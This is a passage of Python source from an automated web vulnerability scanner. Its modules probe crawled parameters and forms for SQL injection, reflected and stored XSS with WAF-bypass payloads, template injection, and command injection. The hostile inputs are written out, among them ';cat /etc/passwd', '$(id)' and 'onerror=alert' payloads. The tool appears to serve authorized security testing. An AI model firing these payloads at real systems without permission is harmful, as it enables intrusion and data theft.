        "q", "search", "query", "keyword", "filter", "term", "name",
        "email", "username", "id", "user_id", "order_id", "product_id",
        "s", "text", "title", "description", "input", "sort", "order"
    }
    # For URL params, only test high-value ones. For original crawled params, test all.
    filtered_params_map = {}
    for url, pnames in params_map.items():
        filtered = [p for p in pnames if p in SQLI_HIGH_VALUE_PARAMS]
        if filtered:
            filtered_params_map[url] = filtered
        elif pnames:  # Keep original crawled params even if not in high-value list
            p_url = urlparse(url)
            if not any(kw in p_url.path.lower() for kw in ["/api/", "/rest/"]):
                filtered_params_map[url] = pnames

    tasks = [(url, param, payload, headers)
             for url, pnames in filtered_params_map.items()
             for param in pnames
             for payload in SQLI_PAYLOADS_ERROR]

    log(f"SQLi Phase 1 (Error-Based): {len(tasks)} combinations (filtered to high-value params)...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_error_sqli, t): t for t in tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                url, param, payload, err, path, method = r
                if url not in found:
                    found.add(url)
                    _auth_h = headers.get("Authorization","")
                    _curl_auth = f' -H "Authorization: {_auth_h}"' if _auth_h else ""
                    _enc = requests.utils.quote(payload, safe="")
                    _curl_url = url.split("?")[0] + f"?{param}={_enc}"
                    add_finding("SQL Injection", "critical", f"{path}?{param}=",
                        f"SQL Injection (error-based) in '{param}'. DB error exposed — full dump possible.",
                        f"GET {path}?{param}={payload} -> DB error: '{err}'",
                        "Use parameterized queries. Never concatenate user input into SQL.",
                        curl=f'curl -sv{_curl_auth} "{_curl_url}"')

    # ── Phase 2: Boolean-Blind (for params not yet confirmed) ─
    # Apply same high-value param filter as Phase 1 — testing all 504 SMART
    # INJECT endpoints × all params × 10 bool pairs × 3 req = 45k+ requests.
    # Boolean-blind only fires on params that actually hold query values.
    not_found_params_raw = [(url, pnames) for url, pnames in params_map.items()
                        if url not in found]
    not_found_params = []
    for url, pnames in not_found_params_raw:
        filtered = [p for p in pnames if p in SQLI_HIGH_VALUE_PARAMS]
        if filtered:
            not_found_params.append((url, filtered))
        elif pnames:
            p_url = urlparse(url)
            if not any(kw in p_url.path.lower() for kw in ["/api/", "/rest/"]):
                not_found_params.append((url, pnames))
    if not_found_params:
        log(f"SQLi Phase 2 (Boolean-Blind): {len(not_found_params)} endpoints (high-value params only)...")

        def _bool_sqli(args):
            url, param, true_p, false_p, hdrs = args
            if url in found:
                return None
            p = urlparse(url)
            ps = parse_qs(p.query)
            base_params = {k: v[0] for k, v in ps.items()}
            try:
                # Get baseline
                baseline = safe_get(url, headers=hdrs, timeout=8, verify=False)
                base_len = len(baseline.text)

                # True condition
                tp_true = base_params.copy(); tp_true[param] = true_p
                resp_true = safe_get(urlunparse(p._replace(query=urlencode(tp_true))),
                    headers=hdrs, timeout=8, verify=False)

                # False condition
                tp_false = base_params.copy(); tp_false[param] = false_p
                resp_false = safe_get(urlunparse(p._replace(query=urlencode(tp_false))),
                    headers=hdrs, timeout=8, verify=False)

                len_true  = len(resp_true.text)
                len_false = len(resp_false.text)
                len_base  = base_len

                # True should match base, false should differ significantly
                true_diff  = abs(len_true  - len_base)
                false_diff = abs(len_false - len_base)

                if false_diff > 50 and true_diff < false_diff * 0.5:
                    return (url, param, true_p, false_p, p.path,
                        len_true, len_false, "boolean-blind")
            except Exception:
                pass
            return None

        bool_tasks = [(url, param, tp, fp, headers)
                      for url, pnames in not_found_params
                      for param in pnames
                      for tp, fp in SQLI_BOOLEAN_PAIRS]

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            futures = {ex.submit(_bool_sqli, t): t for t in bool_tasks}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    url, param, tp, fp, path, lt, lf, method = r
                    if url not in found:
                        found.add(url)
                        add_finding("SQL Injection (Blind)", "critical", f"{path}?{param}=",
                            f"Boolean-blind SQLi in '{param}'. True condition returns {lt} bytes, false returns {lf} bytes. No error message needed.",
                            f"True: {path}?{param}={tp} ({lt}b) vs False: {path}?{param}={fp} ({lf}b)",
                            "Use parameterized queries. Input sanitization alone is insufficient.")

    # ── Phase 3: Time-Based Blind (still not confirmed) ───────
    not_found_params2 = [(url, pnames) for url, pnames in params_map.items()
                         if url not in found]
    if not_found_params2:
        log(f"SQLi Phase 3 (Time-Based): {len(not_found_params2)} endpoints...")

        def _time_sqli(args):
            url, param, payload, delay, db_type, hdrs = args
            if url in found:
                return None
            p = urlparse(url)
            ps = parse_qs(p.query)
            base_params = {k: v[0] for k, v in ps.items()}

            # ── STEP 1: Baseline timing (3 samples) ──────────────────
            # CRITICAL: Time-based SQLi is only valid if the payload
            # causes a delay ABOVE the normal response time.
            # Without this, ANY slow server triggers a false positive.
            try:
                base_times = []
                for _ in range(3):
                    t0 = time.time()
                    safe_get(url, headers=hdrs, timeout=8, verify=False)
                    base_times.append(time.time() - t0)
                baseline_avg = sum(base_times) / len(base_times)
                # If server is already slow (>2s baseline), skip — too unreliable
                if baseline_avg > 2.0:
                    return None
            except Exception:
                return None

            # ── STEP 2: First payload probe ───────────────────────────
            tp = base_params.copy()
            tp[param] = payload
            test_url = urlunparse(p._replace(query=urlencode(tp)))
            try:
                t1 = time.time()
                safe_get(test_url, headers=hdrs, timeout=delay + 6, verify=False)
                elapsed1 = time.time() - t1
                # Must exceed baseline by at least 80% of expected delay
                required = baseline_avg + (delay * 0.8)
                if elapsed1 < required:
                    return None
            except Exception:
                return None

            # ── STEP 3: CONFIRMATION — repeat payload ─────────────────
            # Network jitter can cause a single slow response.
            # A real SQLi delay must be reproducible.
            try:
                t2 = time.time()
                safe_get(test_url, headers=hdrs, timeout=delay + 6, verify=False)
                elapsed2 = time.time() - t2
                required2 = baseline_avg + (delay * 0.7)
                if elapsed2 < required2:
                    return None  # Not reproducible — was jitter
            except Exception:
                return None

            avg_delay = (elapsed1 + elapsed2) / 2
            return (url, param, payload, avg_delay, p.path, db_type, baseline_avg)

        # ── DB-type payload filtering ──────────────────────────────
        # MySQL SLEEP() and MSSQL WAITFOR DELAY cannot execute on SQLite.
        # Node.js/Sequelize apps (Juice Shop etc.) use SQLite — these payloads
        # trigger ORM slow query compilation, not real SQL delay injection.
        # Skip them when tech stack strongly indicates a non-MySQL/MSSQL backend.
        _node_sqlite_signals = {"Node.js", "Angular", "React"}
        _is_likely_sqlite = bool(tech_stack and _node_sqlite_signals & tech_stack)

        def _payload_compatible(db_type):
            if _is_likely_sqlite and db_type in ("MySQL", "MySQL-nested", "MSSQL"):
                return False  # SLEEP/WAITFOR don't exist in SQLite
            return True

        time_tasks = [(url, param, payload, delay, db_type, headers)
                      for url, pnames in not_found_params2
                      for param in pnames
                      for payload, delay, db_type in SQLI_TIME_PAYLOADS
                      if _payload_compatible(db_type)]

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(THREADS, 5)) as ex:
            futures = {ex.submit(_time_sqli, t): t for t in time_tasks}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    url, param, payload, avg_delay, path, db_type, baseline_avg = r
                    if url not in found:
                        found.add(url)
                        add_finding("SQL Injection (Time-Based Blind)", "critical",
                            f"{path}?{param}=",
                            f"Time-based blind SQLi in '{param}' ({db_type}). Confirmed: avg {avg_delay:.1f}s delay (baseline {baseline_avg:.2f}s). Reproducible delay proves SQL execution.",
                            f"GET {path}?{param}={payload} -> {avg_delay:.1f}s (baseline {baseline_avg:.2f}s, confirmed twice)",
                            "Use parameterized queries. This confirms real code execution even with all errors hidden.")

    # ── Phase 4: Forms (error-based) ──────────────────────────
    def _form_sqli(args):
        form, payload, hdrs = args
        action = form["action"]
        if action in found:
            return None
        data = {i["name"]: payload if i["type"] not in ["submit","hidden","button"]
                else i["value"] for i in form["inputs"] if i["name"]}
        try:
            resp = safe_post(action, data=data, headers=hdrs, timeout=8, verify=False) \
                if form["method"] == "post" \
                else safe_get(action, params=data, headers=hdrs, timeout=8, verify=False)
            body = resp.text.lower()
            for err in SQL_ERRORS:
                if err in body:
                    return (action, payload, err)
        except Exception:
            pass
        return None

    form_tasks = [(f, p, headers) for f in forms
                  if f["action"] not in found
                  for p in SQLI_PAYLOADS_ERROR[:30]]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_form_sqli, t): t for t in form_tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                action, payload, err = r
                if action not in found:
                    found.add(action)
                    add_finding("SQL Injection in Form", "critical", action,
                        "SQLi via form — input passed directly into SQL query.",
                        f"POST {action} payload={payload[:80]} -> '{err}'",
                        "Use parameterized queries for all form inputs.")


# ═══════════════════════════════════════════════════════════════
# MODULE 5: XSS — Context-Aware + WAF Bypass + Stored
#
# Context detection:
#   1. Send unique probe to get baseline response
#   2. Find WHERE in HTML the value is reflected
#   3. Choose payload set matching that context
#   4. Fall back to WAF bypass payloads if standard blocked
#
# This catches XSS that generic scanners miss because they send
# <script> tags into JS strings (wrong context = never fires)
# ═══════════════════════════════════════════════════════════════
def _detect_xss_context(resp_text, probe):
    """
    Detect where a probe value appears in HTML response.
    Returns context string matching XSS_CONTEXT_PAYLOADS keys.
    """
    if not probe or probe not in resp_text:
        return "html_body"

    # Find position of probe in HTML
    idx = resp_text.find(probe)
    if idx == -1:
        return "html_body"

    # Look at 200 chars before the probe
    before = resp_text[max(0, idx-200):idx].lower()

    # Inside a JS string double-quoted
    # e.g. var x = "PROBE"  or  data: "PROBE"
    if re.search(r'(var\s+\w+\s*=\s*"|:\s*")\s*$', before):
        return "js_string_double"

    # Inside a JS string single-quoted
    if re.search(r"(var\s+\w+\s*=\s*'|:\s*')\s*$", before):
        return "js_string_single"

    # Inside an HTML attribute double-quoted
    # e.g. <input value="PROBE"  or  <a href="PROBE"
    double_attr = re.search(r'<\w[^>]*\s+\w+="[^"]*$', before)
    if double_attr:
        # Is it a URL attribute (href/src/action)?
        if re.search(r'(href|src|action|data|formaction)="[^"]*$', before):
            return "url_context"
        return "attr_double"

    # Inside an HTML attribute single-quoted
    single_attr = re.search(r"<\w[^>]*\s+\w+='[^']*$", before)
    if single_attr:
        if re.search(r"(href|src|action|data|formaction)='[^']*$", before):
            return "url_context"
        return "attr_single"

    return "html_body"


def test_xss(target, urls, forms, params_map, headers):
    found = set()
    probe = "SXPROBE" + ''.join(random.choices(string.ascii_uppercase, k=6))

    # Standard payloads with probe embedded
    std_payloads = [p.replace("alert(1)", f"alert('{probe}')") for p in XSS_PAYLOADS]
    waf_payloads  = [p.replace("alert(1)", f"alert('{probe}')") for p in XSS_WAF_BYPASS]

    # ── Phase 0: REST endpoint XSS via GET params ──────────────
    # Probe every REST/API endpoint with common params + XSS probe.
    # Checks for reflection in JSON responses and HTML error pages.
    # This catches XSS in API error messages, search results, etc.
    parsed_target = urlparse(target)
    base_origin   = f"{parsed_target.scheme}://{parsed_target.netloc}"

    XSS_SEARCH_PARAMS = ["q", "search", "query", "keyword", "name",
                         "email", "username", "filter", "term", "s",
                         "text", "title", "input", "description"]
    REST_XSS_KEYWORDS = ["/api/", "/rest/", "/v1/", "/v2/", "/v3/",
                         "search", "products", "users", "items"]

    xss_fast_payloads = [
        f"<script>alert('{probe}')</script>",
        f"<img src=x onerror=alert('{probe}')>",
        f"<svg onload=alert('{probe}')>",
        f'"><img src=x onerror=alert("{probe}")>',
        f"'{probe}<",
        probe,  # plain probe first to detect reflection
    ]

    def _test_rest_xss(args):
        url, param, payload = args
        p = urlparse(url)
        test_url = f"{base_origin}{p.path}?{param}={payload}"
        key = f"{p.path}:{param}"
        if key in found:
            return None
        try:
            resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
            # Check if probe/payload reflected in response
            if probe in resp.text or payload in resp.text:
                # Confirm it's not just in a static part
                clean_resp = safe_get(f"{base_origin}{p.path}", headers=headers, timeout=6, verify=False)
                if probe not in clean_resp.text:
                    return (test_url, param, payload, p.path, key)
        except Exception:
            pass
        return None

    rest_xss_targets = []
    seen_paths_xss = set()
    for url in urls:
        p = urlparse(url)
        if p.path in seen_paths_xss:
            continue
        if any(kw in p.path.lower() for kw in REST_XSS_KEYWORDS):
            seen_paths_xss.add(p.path)
            for param in XSS_SEARCH_PARAMS[:6]:
                for payload in xss_fast_payloads:
                    rest_xss_targets.append((url, param, payload))

    if rest_xss_targets:
        log(f"XSS Phase 0 (REST endpoint reflection): {len(rest_xss_targets)} combinations...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            futures = {ex.submit(_test_rest_xss, t): t for t in rest_xss_targets}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    test_url, param, payload, path, key = r
                    if key not in found:
                        found.add(key)
                        severity = "high" if "<" in payload else "medium"
                        add_finding("Reflected XSS in REST Endpoint", severity,
                            f"{path}?{param}=",
                            f"XSS via REST endpoint param '{param}' — input reflected without encoding. "
                            f"Attacker can steal session tokens, redirect users, or perform actions on their behalf.",
                            f"GET {path}?{param}={payload[:100]} -> probe reflected in response",
                            "HTML-encode all output. Use Content-Security-Policy. "
                            "Validate and sanitize all user-supplied input server-side.")

    def _get_context_payloads(context, prb):
        """Get payloads for detected context"""
        ctx_payloads = XSS_CONTEXT_PAYLOADS.get(context, XSS_CONTEXT_PAYLOADS["html_body"])
        return [p.replace("alert(1)", f"alert('{prb}')") for p in ctx_payloads]

    def _test_xss_param(args):
        url, param = args
        if url in found:
            return None
        p  = urlparse(url)
        ps = parse_qs(p.query)

        # ── Step 1: Baseline with unique probe to detect context ──
        tp_probe = {k: v[0] for k, v in ps.items()}
        tp_probe[param] = probe
        try:
            base_resp = safe_get(urlunparse(p._replace(query=urlencode(tp_probe))),
                headers=headers, timeout=8, verify=False)
            context = _detect_xss_context(base_resp.text, probe)
            
            # If endpoint doesn't even reflect the probe, skip XSS testing entirely
            # (endpoint pre-filter already caught most; this is a per-param safety net)
            if probe not in base_resp.text:
                return None
        except Exception:
            context = "html_body"

        # ── Step 2: Context-targeted payloads first ──
        ctx_payloads = _get_context_payloads(context, probe)

        for payload in ctx_payloads + std_payloads:
            if url in found:
                return None
            tp = {k: v[0] for k, v in ps.items()}
            tp[param] = payload
            test_url = urlunparse(p._replace(query=urlencode(tp)))
            try:
                resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
                if probe in resp.text or payload in resp.text:
                    return (url, param, payload, p.path, context)
            except Exception:
                pass

        # ── Step 3: WAF bypass payloads if standard failed ──
        for payload in waf_payloads[:15]:
            if url in found:
                return None
            tp = {k: v[0] for k, v in ps.items()}
            tp[param] = payload
            test_url = urlunparse(p._replace(query=urlencode(tp)))
            try:
                resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
                if probe in resp.text or payload in resp.text:
                    return (url, param, payload, p.path, f"{context}+WAF-bypass")
            except Exception:
                pass

        return None

    # ── ENDPOINT-LEVEL REFLECTION PRE-FILTER ─────────────────────
    # Before per-param testing, quickly check which endpoints even
    # reflect user input at all. JSON APIs that return structured data
    # usually DON'T reflect params — skip them entirely.
    # This reduces 505 tasks to ~50-100 tasks typically.
    reflective_endpoints = set()
    ep_probe = "XSSEPPROBE" + ''.join(random.choices(string.ascii_uppercase, k=6))
    ep_check_tasks = list({urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path
                           for url, _ in params_map.items()})

    def _check_ep_reflects(base_path_url):
        """Check if endpoint reflects ANY param value at all"""
        try:
            # Test with a benign probe value on a dummy param
            test_url = base_path_url + f"?_xss_ep_chk={ep_probe}"
            resp = safe_get(test_url, headers=headers, timeout=6, verify=False)
            # If probe appears in response OR if response is HTML (not pure JSON)
            ct = resp.headers.get("content-type", "")
            is_html = "html" in ct or (resp.text.strip()[:1] == "<")
            reflects = ep_probe in resp.text
            return base_path_url, (reflects or is_html)
        except Exception:
            return base_path_url, False

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for base_url, reflects in ex.map(_check_ep_reflects, ep_check_tasks):
            if reflects:
                reflective_endpoints.add(base_url)

    # Only test params on endpoints that actually reflect content
    tasks = []
    for url, pnames in params_map.items():
        p = urlparse(url)
        base_path = f"{p.scheme}://{p.netloc}{p.path}"
        if base_path in reflective_endpoints:
            for param in pnames:
                tasks.append((url, param))

    log(f"XSS: testing {len(tasks)} params on {len(reflective_endpoints)} reflective endpoints (of {len(ep_check_tasks)} total)...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_test_xss_param, t): t for t in tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                url, param, payload, path, context = r
                if url not in found:
                    found.add(url)
                    waf_note = " (WAF bypass)" if "WAF-bypass" in context else ""
                    ctx_clean = context.replace("+WAF-bypass", "")
                    _auth_h = headers.get("Authorization","")
                    _curl_auth = f' -H "Authorization: {_auth_h}"' if _auth_h else ""
                    _enc_payload = requests.utils.quote(payload, safe="")
                    _curl_url = url.split("?")[0] + f"?{param}={_enc_payload}"
                    add_finding("Reflected XSS", "high", f"{path}?{param}=",
                        f"XSS in '{param}' — context: {ctx_clean}{waf_note}. Payload executed in {ctx_clean} context.",
                        f"GET {path}?{param}={payload[:120]}",
                        "HTML-encode all output. Use CSP. Use auto-escaping template engine.",
                        curl=f'curl -s{_curl_auth} "{_curl_url}"')

    # ── Forms XSS ─────────────────────────────────────────────
    def _xss_form(args):
        form, payload = args
        action = form["action"]
        if action in found:
            return None
        data = {i["name"]: payload if i["type"] not in ["submit","hidden","button"]
                else i["value"] for i in form["inputs"] if i["name"]}
        try:
            resp = safe_post(action, data=data, headers=headers, timeout=8, verify=False) \
                if form["method"] == "post" \
                else safe_get(action, params=data, headers=headers, timeout=8, verify=False)
            if payload in resp.text or probe in resp.text:
                return (action, payload)
        except Exception:
            pass
        return None

    form_tasks = [(f, p) for f in forms
                  if f["action"] not in found
                  for p in (std_payloads[:15] + waf_payloads[:8])]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for r in ex.map(_xss_form, form_tasks):
            if r:
                action, payload = r
                if action not in found:
                    found.add(action)
                    add_finding("XSS in Form", "high", action,
                        "XSS via form — payload reflected in response.",
                        f"POST {action} -> {payload[:100]}",
                        "Sanitize and encode all user input. Use DOMPurify.")

    # ── Stored XSS ────────────────────────────────────────────
    stored_probe   = "STORED" + ''.join(random.choices(string.ascii_uppercase, k=6))
    stored_payload = f'<script>alert("{stored_probe}")</script>'
    stored_candidates = []

    for form in forms[:10]:
        if form["action"] in found:
            continue
        data = {i["name"]: stored_payload if i["type"] not in ["submit","hidden","button"]
                else i["value"] for i in form["inputs"] if i["name"]}
        try:
            if form["method"] == "post":
                safe_post(form["action"], data=data, headers=headers, timeout=8, verify=False)
            else:
                safe_get(form["action"], params=data, headers=headers, timeout=8, verify=False)
            stored_candidates.append((form["action"], form.get("page", target), stored_payload))
        except Exception:
            pass

    for action, page, payload in stored_candidates:
        try:
            resp = safe_get(page, headers=headers, timeout=8, verify=False)
            if stored_probe in resp.text and action not in found:
                found.add(action)
                add_finding("Stored XSS", "critical", action,
                    f"Stored XSS — injected payload persisted to page {page}. Affects ALL visitors.",
                    f"POST {action} -> stored -> GET {page} -> '{stored_probe}' found",
                    "Sanitize input on write. HTML-encode on read. Use Content-Security-Policy.")
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# MODULE 6: SSTI — Server-Side Template Injection
# Zero false positives via canary math verification:
#   Step 1: Send payload with random A*B (e.g. 47*83 = 3901)
#   Step 2: Check response contains EXACT product (3901)
#   Step 3: Verify product NOT in baseline (rules out coincidence)
#   Step 4: Confirm with a SECOND different multiplication
# Only fires if BOTH canaries evaluate correctly.
# ═══════════════════════════════════════════════════════════════
def test_ssti(target, urls, forms, params_map, headers):
    found = set()

    def _build_ssti_canary():
        """Generate two random multiplications with unambiguous products"""
        while True:
            a1 = random.randint(30, 99)
            b1 = random.randint(30, 99)
            product1 = a1 * b1
            # Product must be >= 4 digits to avoid accidental matches
            if product1 >= 1000:
                break
        while True:
            a2 = random.randint(30, 99)
            b2 = random.randint(30, 99)
            product2 = a2 * b2
            if product2 >= 1000 and product2 != product1:
                break
        return (a1, b1, product1), (a2, b2, product2)

    def _make_payloads(a, b):
        """Build actual payload strings for each engine"""
        return [
            (f"{{{{{a}*{b}}}}}", str(a*b), "Jinja2/Twig"),
            (f"${{{a}*{b}}}", str(a*b), "FreeMarker/Spring"),
            (f"<%= {a}*{b} %>", str(a*b), "ERB/EJS"),
            (f"*{{{a}*{b}}}", str(a*b), "Spring SpEL"),
            (f"#{{{a}*{b}}}", str(a*b), "Pebble/Ruby"),
        ]

    def _verify_ssti(url, param, a1, b1, p1, a2, b2, p2, engine, path):
        """
        Confirm SSTI with two independent canaries.
        Both must evaluate correctly AND neither can be in baseline.
        """
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query)

        # Get baseline — check products not already there
        try:
            base_resp = safe_get(url, headers=headers, timeout=8, verify=False)
            if str(p1) in base_resp.text or str(p2) in base_resp.text:
                return False  # product already in page — not SSTI
        except Exception:
            return False

        # Test canary 1
        tp1 = {k: v[0] for k, v in qs.items()}
        tp1[param] = f"{{{{{a1}*{b1}}}}}"
        try:
            r1 = safe_get(urlunparse(parsed._replace(query=urlencode(tp1))),
                headers=headers, timeout=8, verify=False)
            if str(p1) not in r1.text:
                return False
        except Exception:
            return False

        # Test canary 2 — different numbers
        tp2 = {k: v[0] for k, v in qs.items()}
        tp2[param] = f"{{{{{a2}*{b2}}}}}"
        try:
            r2 = safe_get(urlunparse(parsed._replace(query=urlencode(tp2))),
                headers=headers, timeout=8, verify=False)
            if str(p2) not in r2.text:
                return False
        except Exception:
            return False

        return True  # Both canaries confirmed — real SSTI

    def _test_ssti_param(args):
        url, param = args
        if url in found:
            return None
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query)

        (a1, b1, p1), (a2, b2, p2) = _build_ssti_canary()

        # Quick probe — just Jinja2 first (most common)
        tp = {k: v[0] for k, v in qs.items()}
        tp[param] = f"{{{{{a1}*{b1}}}}}"
        test_url = urlunparse(parsed._replace(query=urlencode(tp)))

        try:
            resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
            if str(p1) not in resp.text:
                return None  # Fast exit — Jinja2 not evaluated, skip other engines

            # Looks promising — verify with double canary
            engine = "Jinja2/Twig"
            if _verify_ssti(url, param, a1, b1, p1, a2, b2, p2, engine, parsed.path):
                return (url, param, f"{{{{{a1}*{b1}}}}}", str(p1), engine, parsed.path)

            # Try other engines only if Jinja2 passed quick check
            for payload_tmpl, _, eng in [
                (f"${{{a1}*{b1}}}", str(p1), "FreeMarker/Spring"),
                (f"<%= {a1}*{b1} %>", str(p1), "ERB/EJS"),
                (f"*{{{a1}*{b1}}}", str(p1), "Spring SpEL"),
            ]:
                tp2 = {k: v[0] for k, v in qs.items()}
                tp2[param] = payload_tmpl
                try:
                    r = safe_get(urlunparse(parsed._replace(query=urlencode(tp2))),
                        headers=headers, timeout=8, verify=False)
                    if str(p1) in r.text:
                        if _verify_ssti(url, param, a1, b1, p1, a2, b2, p2, eng, parsed.path):
                            return (url, param, payload_tmpl, str(p1), eng, parsed.path)
                except Exception:
                    pass

        except Exception:
            pass
        return None

    tasks = [(url, param)
             for url, pnames in params_map.items()
             for param in pnames]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for r in ex.map(_test_ssti_param, tasks):
            if r:
                url, param, payload, expected, engine, path = r
                if url not in found:
                    found.add(url)
                    add_finding("Server-Side Template Injection (SSTI)", "critical",
                        f"{path}?{param}=",
                        f"SSTI confirmed in '{param}' ({engine}). Two independent math canaries evaluated server-side — RCE possible.",
                        f"GET {path}?{param}={payload} -> '{expected}' (verified with 2 canaries, not in baseline)",
                        "Never pass user input to template engines. Use sandboxing. Treat SSTI as RCE.")

    # Test forms — same double-canary approach
    for form in forms:
        if form["action"] in found:
            continue
        (a1, b1, p1), (a2, b2, p2) = _build_ssti_canary()
        payload = f"{{{{{a1}*{b1}}}}}"
        data = {i["name"]: payload if i["type"] not in ["submit","hidden","button"]
                else i["value"] for i in form["inputs"] if i["name"]}
        try:
            resp = safe_post(form["action"], data=data, headers=headers, timeout=8, verify=False) \
                if form["method"] == "post" \
                else safe_get(form["action"], params=data, headers=headers, timeout=8, verify=False)
            # For forms, single canary + baseline check (can't do double-canary easily on POST)
            if str(p1) in resp.text:
                # Baseline check
                try:
                    base_data = {i["name"]: i.get("value","test") for i in form["inputs"] if i["name"]}
                    base_resp = safe_post(form["action"], data=base_data, headers=headers, timeout=8, verify=False) \
                        if form["method"] == "post" \
                        else safe_get(form["action"], params=base_data, headers=headers, timeout=8, verify=False)
                    if str(p1) not in base_resp.text and form["action"] not in found:
                        # Second canary for forms
                        payload2 = f"{{{{{a2}*{b2}}}}}"
                        data2 = {i["name"]: payload2 if i["type"] not in ["submit","hidden","button"]
                                else i["value"] for i in form["inputs"] if i["name"]}
                        resp2 = safe_post(form["action"], data=data2, headers=headers, timeout=8, verify=False) \
                            if form["method"] == "post" \
                            else safe_get(form["action"], params=data2, headers=headers, timeout=8, verify=False)
                        if str(p2) in resp2.text:
                            found.add(form["action"])
                            add_finding("SSTI in Form", "critical", form["action"],
                                f"SSTI via form (Jinja2/Twig) — two math canaries confirmed. RCE possible.",
                                f"POST {form['action']} {payload} -> '{p1}', {payload2} -> '{p2}' (both verified)",
                                "Never pass user input to template engines. Treat as RCE.")
                except Exception:
                    pass
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# MODULE 7: COMMAND INJECTION
# Smart targeting to avoid 2-minute scans:
#   - Output-based payloads run on ALL params (fast)
#   - Time-based sleep payloads run ONLY on shell-likely params
#     (host, cmd, exec, ping, ip, query, search, file, path etc.)
#   - Skip params that are obviously not shell-related
#     (id, page, cat, RetURL, style, token etc.)
# ═══════════════════════════════════════════════════════════════

# Params likely to be passed to shell — time-based testing here
CMDI_SHELL_PARAMS = {
    'host', 'hostname', 'ip', 'addr', 'address', 'domain',
    'cmd', 'command', 'exec', 'execute', 'run', 'shell',
    'ping', 'tracert', 'nslookup', 'dig',
    'file', 'filename', 'path', 'filepath',
    'query', 'search', 'input', 'data',
    'target', 'server', 'port',
    'name', 'value', 'text', 'content',
}

# Params that are definitely NOT shell-related — skip time-based
CMDI_SAFE_PARAMS = {
    'id', 'page', 'cat', 'artist', 'pic', 'item', 'returl',
    'returnurl', 'next', 'redirect', 'ref', 'token', 'csrf',
    'style', 'theme', 'lang', 'locale', 'format', 'type',
    'sort', 'order', 'limit', 'offset', 'per_page',
}

def test_cmdi(target, urls, forms, params_map, headers):
    found = set()

    # Output-based payloads only — fast, no sleep
    CMDI_OUTPUT_PAYLOADS = [
        (";id",              ["uid=", "gid="],               "Linux"),
        ("&&id",             ["uid=", "gid="],               "Linux"),
        ("|id",              ["uid=", "gid="],               "Linux"),
        ("`id`",             ["uid=", "gid="],               "Linux"),
        ("$(id)",            ["uid=", "gid="],               "Linux"),
        (";whoami",          ["root", "www-data", "nobody"], "Linux"),
        ("&&whoami",         ["root", "www-data", "nobody"], "Linux"),
        ("|whoami",          ["root", "www-data", "nobody"], "Linux"),
        (";cat /etc/passwd", ["root:x:0:0"],                 "Linux"),
        ("&whoami",          ["nt authority", "system"],     "Windows"),
        ("|whoami",          ["nt authority", "system"],     "Windows"),
        ("&&whoami",         ["nt authority", "system"],     "Windows"),
        ("&dir",             ["volume in drive"],            "Windows"),
        (";dir",             ["volume in drive"],            "Windows"),
    ]

    # Time-based blind payloads — ONLY run on shell-likely params
    CMDI_TIME_PAYLOADS = [
        (";sleep 3",             3, "Linux"),
        ("&&sleep 3",            3, "Linux"),
        ("|sleep 3",             3, "Linux"),
        ("& ping -n 4 127.0.0.1", 3, "Windows"),
        (";ping -c 3 127.0.0.1", 3, "Linux"),
    ]

    def _test_cmdi_output(args):
        url, param, payload, signatures, os_type = args
        if url in found:
            return None
        p  = urlparse(url)
        ps = parse_qs(p.query)
        tp = {k: v[0] for k, v in ps.items()}

        # Append to existing value (more realistic — don't replace)
        tp[param] = tp.get(param, "test") + payload
        test_url = urlunparse(p._replace(query=urlencode(tp)))
        try:
            resp = safe_get(test_url, headers=headers, timeout=10, verify=False)
            body = resp.text.lower()
            # Quick check: any signature present?
            hit_sig = None
            for sig in signatures:
                if sig.lower() in body:
                    hit_sig = sig
                    break
            if not hit_sig:
                return None
        except Exception:
            return None

        # ── DIFFERENTIAL BASELINE (only on hits — saves 50% requests) ──
        # Fetch clean baseline only when we have a potential hit.
        # If signature already in baseline, it's app data not injection.
        try:
            base_tp = {k: v[0] for k, v in ps.items()}
            base_tp[param] = tp.get(param, "test")
            base_url = urlunparse(p._replace(query=urlencode(base_tp)))
            baseline_resp = safe_get(base_url, headers=headers, timeout=8, verify=False)
            baseline_body = baseline_resp.text.lower()
            if hit_sig.lower() in baseline_body:
                return None  # Signature pre-exists — false positive
        except Exception:
            pass  # If baseline fails, still flag (conservative)

        return (url, param, payload, hit_sig, p.path, os_type, "output")

    def _test_cmdi_time(url, param, headers):
        """
        Time-based blind CmdI — 5-request confirmation protocol.
        Identical rigor to SQLi time-based to eliminate Sequelize/ORM slow-query FPs.

        Protocol:
          STEP 1 — 3× baseline requests → compute avg. Skip if server already slow (>2s avg).
          STEP 2 — 1st payload probe  → must exceed baseline by ≥80% of expected delay.
          STEP 3 — 2nd payload probe  → must ALSO exceed baseline by ≥70% of expected delay.
          Only flag if BOTH payload probes reproduce the delay consistently.

        Why 3 baselines: ORM queries (Sequelize, Hibernate, etc.) have variable latency.
        A single baseline can be artificially fast, making jitter look like injection.
        Three samples give a reliable average and catch slow-server false positives early.
        """
        if url in found:
            return None
        p  = urlparse(url)
